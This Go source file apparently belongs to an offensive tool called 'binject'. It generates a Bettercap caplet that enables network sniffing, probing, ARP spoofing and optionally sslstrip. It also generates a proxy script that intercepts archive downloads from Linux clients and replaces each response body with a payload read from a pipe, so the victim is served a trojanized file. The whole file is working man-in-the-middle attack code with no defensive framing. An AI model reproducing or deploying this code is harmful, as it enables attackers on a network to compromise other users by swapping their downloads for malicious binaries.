package main

import (
	"os"
	"text/template" //text/template, NOT html/template!!!
)

// GenerateCaplet - generates the binject caplet file from template
func GenerateCaplet(filename string) error {
	templ :=
		`
# Bettercap will treat all these as strings but add / to the beginning and end, making them into regex
# !!! DO NOT USE QUOTES HERE !!!
set binject.devices linux
set binject.useragent.linux    .*Linux.*|.*linux.*
set binject.extensions.linux    tgz,tar.gz,zip
set http.proxy.script binject.js

# uncomment if you want sslstrip enabled
# set http.proxy.sslstrip true
# start proxy
http.proxy on

# Turn on net.sniff
net.sniff on
# Turn on net.probe for 5 seconds - this REALLY helps find all devices on the net. 
net.probe on
# sleep for 5 seconds and wait for probing to be done
sleep 5
# turn net.probe off
net.probe off
# sleep one more second for safety 
sleep 1
# be aware that net.probe and arp.spoof cannot run at the same time
# turn arp spoofing on 
arp.spoof on
`
	if _, err := os.Stat(filename); err != nil {
		if os.IsNotExist(err) {
			f, err := os.Create(filename)
			if err != nil {
				return err
			}
			t := template.Must(template.New("cap").Parse(templ))
			err = t.Execute(f, nil)
			if err != nil {
				return err
			}
		} else {
			return err
		}
	}
	return nil
}

// CapletScriptConfig - config for GenerateCapletScript
type CapletScriptConfig struct {
	DryPipe string
	WetPipe string
}

// GenerateCapletScript - generates the binject caplet script file from template
func GenerateCapletScript(filename string, config CapletScriptConfig) error {

	templ := `
var targets = {}

var nullbyte = "\u0000"

var green   = "\033[32m",
    boldRed = "\033[1;31m",
    onRed   = "\033[41m",
    reset   = "\033[0m",
    redLine = "\n  " + onRed + " " + reset

function onLoad() {
	devices = env["binject.devices"].split(",")
	logStr = ""
	for (var i = 0; i < devices.length; i++) {
		item = {
			"device": devices[i],
			"useragent": env[ "binject.useragent." + devices[i] ],
			"extensions": env[ "binject.extensions." + devices[i] ].toLowerCase().split(",")
		}
		targets[i] = item
		logStr += "\n  " + green + targets[i]["device"] + reset +
		          "\n    User-Agent: " + targets[i]["useragent"] + 
		          "\n    Extensions: " + targets[i]["extensions"] + "\n"
	}
	log("Binject loaded.\n\nDownload Binject targets: \n" + logStr)
}

function onResponse(req, res) {
	// First of all check whether the requested path might have an extension (to save cpu)
	var requestedFileName = req.Path.replace(/.*\//g, "")
	if ( requestedFileName.indexOf(".") != -1 ) {
		var userAgent = req.GetHeader("User-Agent", ""),
		    extension
		// Iterate through targets
		for ( var t = 0; t < Object.keys(targets).length; t++ ) {
			// Check if User-Agent is a target
			regex = new RegExp(targets[t]["useragent"])
			if ( userAgent.match(regex) ) {
				// Iterate through target extensions
				for (var e = 0; e < targets[t]["extensions"].length; e++) {
					// Check if requested path contains a targeted extension
					// function endsWith() could be a nice simplification here
					if ( requestedFileName.replace(/.*\./g, "").toLowerCase() == targets[t]["extensions"][e] ) {
						extension = targets[t]["extensions"][e]
						// Binject
						logStr = "\n" + redLine + "  Binjecting download request from " + boldRed + req.Client.IP + reset + 
						         redLine + 
						         redLine + "  Found " + boldRed + extension.toUpperCase() + reset + " extension in " + boldRed + req.Hostname + req.Path + reset + 
						         redLine + 
						         redLine + "  Grabbing " + boldRed + targets[t]["device"].toUpperCase() + reset + " payload..."
					
		// ** Get http request and parse it, pipe to drypipe.
		var body = res.ReadBody()		
		log(body)
		writeFile("{{.DryPipe}}",body)
		// ** Read the output from from wetpipe.
		payload = readFile("{{.WetPipe}}")

		// Check our payload size
		payloadSize = payload.length
		logStr += redLine + "  The raw size of your payload is " + boldRed + payloadSize + reset + " bytes"

		// Set Content-Disposition header to enforce file download instead of in-browser preview
		res.SetHeader("Content-Disposition", "attachment; filename=\"" + requestedFileName + "\"")
		// Update Content-Length header
		res.SetHeader("Content-Length", payload.length)
		logStr += redLine + 
					redLine + "  Serving your payload to " + boldRed + req.Client.IP + reset + "...\n"
		log(logStr)
		// this ?
		res.Body = payload
					}
				}
			}
		}
	}
}
`
	if _, err := os.Stat(filename); err != nil {
		if os.IsNotExist(err) {
			f, err := os.Create(filename)
			if err != nil {
				return err
			}
			t := template.Must(template.New("cap").Parse(templ))
			err = t.Execute(f, config)
			if err != nil {
				return err
			}
		} else {
			return err
		}
	}
	return nil
}
